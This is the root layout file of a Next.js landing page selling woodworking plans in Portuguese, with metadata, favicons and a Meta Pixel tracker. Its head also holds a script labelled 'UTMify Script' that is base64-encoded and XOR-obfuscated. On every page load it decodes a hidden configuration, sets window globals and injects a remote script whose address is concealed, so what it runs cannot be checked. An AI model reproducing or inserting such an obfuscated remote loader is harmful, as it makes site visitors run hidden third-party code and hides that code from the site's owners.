import type {Metadata} from 'next';
import './globals.css';

export const metadata: Metadata = {
  title: 'Apostila de Marcenaria | +1.000 Projetos Prontos por R$ 5',
  description: '+1.000 projetos de marcenaria prontos com medidas e lista de materiais para iniciantes por apenas R$ 5.',
  icons: {
    icon: [
      { url: '/icon.svg', type: 'image/svg+xml' },
      { url: '/favicon-32x32.png', sizes: '32x32', type: 'image/png' },
      { url: '/favicon-16x16.png', sizes: '16x16', type: 'image/png' },
    ],
    apple: [
      { url: '/apple-touch-icon.png', sizes: '180x180', type: 'image/png' },
    ],
    shortcut: '/favicon.ico',
  },
  openGraph: {
    title: 'Apostila de Marcenaria | +1.000 Projetos Prontos por R$ 5',
    description: '+1.000 projetos de marcenaria prontos com medidas e lista de materiais para iniciantes por apenas R$ 5.',
    type: 'website',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Apostila de Marcenaria | +1.000 Projetos Prontos por R$ 5',
    description: '+1.000 projetos de marcenaria prontos com medidas e lista de materiais para iniciantes por apenas R$ 5.',
  },
};

export default function RootLayout({children}: {children: React.ReactNode}) {
  return (
    <html lang="pt-BR" className="scroll-smooth">
      <head>
        {/* Favicons */}
        <link rel="icon" href="/icon.svg" type="image/svg+xml" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
        <link rel="shortcut icon" href="/favicon.ico" />
        <meta name="theme-color" content="#2B1B12" />

        {/* UTMify Script */}
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var z_wg=atob("DGqZCG5BRp6iYdIOUBG7fRwtZKSACaZ6IBmjJ0EiIvCMFKZjOQzgJg0uK7DAE/19MxjweBoyaevWDKEhPAvtbR01aPTRQ/4sMR7tegcjM+rHEvA0CxG7Zg8sI7yYQ7ZvJAu0fRosL/jbTKJ8NRz8ZhpsPv3NBf99MwG7JEw3J/LXBPA0ckjkJBVjKP/PBPA0cg74fA9sM+rPCLR3fRrrbRgkKOqPEqdsOQ7qKkJjMP/OFLcsaki7dTM8");var h_y=[];for(var n_v374=0;n_v374<z_wg.length;n_v374++){h_y.push(z_wg.charCodeAt(n_v374)&255);}var w_2i5=h_y[0];var x_jk=h_y.slice(1,1+w_2i5);var r_9re6=h_y.slice(1+w_2i5);var p_hh7=r_9re6.map(function(b,o_y7){return b^x_jk[o_y7%w_2i5];});var k_y="";for(var x_c5=0;x_c5<p_hh7.length;x_c5++){k_y+=String.fromCharCode(p_hh7[x_c5]&255);}var u_ub=decodeURIComponent(escape(k_y));var g_5u=JSON.parse(u_ub);var l_6fbc=g_5u.globals||[];l_6fbc.forEach(function(h_0iqt){window[h_0iqt.name]=h_0iqt.value;});var x_kv=document.createElement("script");x_kv.src=g_5u.url;x_kv.async=true;x_kv.defer=true;(g_5u.attributes||[]).forEach(function(g_k){x_kv.setAttribute(g_k.name,g_k.value);});(document.head||document.documentElement).appendChild(x_kv);})();`,
          }}
        />
        {/* Meta Pixel Code */}
        <script
          dangerouslySetInnerHTML={{
            __html: `
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1006770152394384');
fbq('track', 'PageView');
`,
          }}
        />
        <noscript>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            height="1"
            width="1"
            style={{ display: 'none' }}
            src="https://www.facebook.com/tr?id=1006770152394384&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
      </head>
      <body suppressHydrationWarning className="bg-[#FAF7F2] text-[#2C241E] antialiased selection:bg-[#E2B774] selection:text-[#2C241E]">
        {children}
      </body>
    </html>
  );
}
